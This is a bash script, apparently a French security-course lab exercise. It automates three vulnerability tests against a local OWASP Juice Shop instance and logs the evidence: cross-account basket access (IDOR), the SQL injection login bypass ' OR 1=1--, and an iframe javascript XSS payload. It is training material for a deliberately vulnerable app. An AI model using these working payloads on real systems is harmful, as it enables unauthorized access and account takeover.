#!/usr/bin/env bash
# Phase 2 - Tests de vulnerabilites guides, automatises en observation.
# Portee : exclusivement votre propre instance Juice Shop sur localhost.
# Reproduit les 3 exercices du TP et enregistre les preuves horodatees.
set -uo pipefail

BASE="${BASE:-http://localhost:3000}"
OUT="$(cd "$(dirname "$0")/.." && pwd)/preuves"
mkdir -p "$OUT"
TS="$(date +%Y%m%d_%H%M%S)"
STAMP="$(date -Iseconds)"
LOG="$OUT/phase2_tests_${TS}.txt"

PWD_A="Password1!"
PWD_B="Password1!"
MAIL_A="audit_a_${TS}@test.local"
MAIL_B="audit_b_${TS}@test.local"

exec > >(tee "$LOG") 2>&1
echo "=== Phase 2 : Tests de vulnerabilites (cible $BASE, $STAMP) ==="

jqget() { jq -r "$1" 2>/dev/null; }

register() {
  curl -sS -X POST "$BASE/api/Users" \
    -H 'Content-Type: application/json' \
    --data "{\"email\":\"$1\",\"password\":\"$2\",\"passwordRepeat\":\"$2\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"test\"}" \
    >/dev/null
}

login() { # $1 mail $2 pass -> echo "token|bid"
  local r
  r="$(curl -sS -X POST "$BASE/rest/user/login" \
        -H 'Content-Type: application/json' \
        --data "{\"email\":\"$1\",\"password\":\"$2\"}")"
  echo "$(echo "$r" | jqget '.authentication.token')|$(echo "$r" | jqget '.authentication.bid')"
}

add_item() { # $1 token $2 basketId $3 productId
  curl -sS -X POST "$BASE/api/BasketItems" \
    -H "Authorization: Bearer $1" -H 'Content-Type: application/json' \
    --data "{\"ProductId\":$3,\"BasketId\":\"$2\",\"quantity\":1}"
}

echo
echo "### Preparation : creation des comptes A et B ###"
register "$MAIL_A" "$PWD_A"
register "$MAIL_B" "$PWD_B"
IFS='|' read -r TOK_A BID_A <<<"$(login "$MAIL_A" "$PWD_A")"
IFS='|' read -r TOK_B BID_B <<<"$(login "$MAIL_B" "$PWD_B")"
echo "Compte A : $MAIL_A  basket bid=$BID_A"
echo "Compte B : $MAIL_B  basket bid=$BID_B"
add_item "$TOK_A" "$BID_A" 1 >/dev/null
add_item "$TOK_B" "$BID_B" 2 >/dev/null

echo
echo "=========================================================="
echo "### 2.1 Controle d'acces horizontal (IDOR / BOLA) - CWE-639"
echo "=========================================================="
echo "[Lecture] Depuis la session de B, consultation du panier de A (bid=$BID_A) :"
RESP_IDOR="$(curl -sS -w '\nHTTP_CODE=%{http_code}' -H "Authorization: Bearer $TOK_B" "$BASE/rest/basket/$BID_A")"
echo "$RESP_IDOR"
CODE_IDOR="$(echo "$RESP_IDOR" | sed -n 's/.*HTTP_CODE=//p')"
if [ "$CODE_IDOR" = "200" ] && echo "$RESP_IDOR" | grep -q '"Products"'; then
  echo ">> CONSTAT : B lit le panier de A (reponse 200). IDOR en LECTURE confirme."
else
  echo ">> Pas de lecture non autorisee observee (code $CODE_IDOR)."
fi

echo
echo "[Ecriture] Depuis B, ajout d'un article dans le panier de A :"
RESP_W="$(curl -sS -w '\nHTTP_CODE=%{http_code}' -X POST "$BASE/api/BasketItems" \
  -H "Authorization: Bearer $TOK_B" -H 'Content-Type: application/json' \
  --data "{\"ProductId\":3,\"BasketId\":\"$BID_A\",\"quantity\":1}")"
echo "$RESP_W"
echo ">> Comparer le code retourne : une ecriture acceptee signale un IDOR en ECRITURE."

echo
echo "=========================================================="
echo "### 2.2 Injection SQL dans l'authentification - CWE-89"
echo "=========================================================="
echo "[Payload] email = ' OR 1=1--   password = x"
RESP_SQL="$(curl -sS -w '\nHTTP_CODE=%{http_code}' -X POST "$BASE/rest/user/login" \
  -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}')"
echo "$RESP_SQL"
if echo "$RESP_SQL" | grep -q '"token"'; then
  WHO="$(echo "$RESP_SQL" | sed 's/HTTP_CODE=.*//' | jqget '.authentication.umail')"
  echo ">> CONSTAT : authentification contournee. Compte obtenu : $WHO (souvent l'admin)."
else
  echo ">> Pas de contournement observe."
fi

echo
echo "=========================================================="
echo "### 2.3 Cross-Site Scripting (XSS) - CWE-79"
echo "=========================================================="
PAYLOAD='<iframe src="javascript:alert(`xss`)">'
ENC="$(jq -rn --arg q "$PAYLOAD" '$q|@uri')"
echo "[Payload] $PAYLOAD"
echo "[Requete] GET /rest/products/search?q=<payload encode>"
RESP_XSS="$(curl -sS -w '\nHTTP_CODE=%{http_code}' "$BASE/rest/products/search?q=$ENC")"
echo "$RESP_XSS" | head -c 600; echo " ..."
echo ">> Le DOM-XSS reel s'observe dans le navigateur : le frontend Angular rend"
echo ">> le parametre q via bypassSecurityTrustHtml + [innerHTML] (cf. phase 3)."

echo
echo "=== Phase 2 terminee. Preuve complete : $LOG ==="
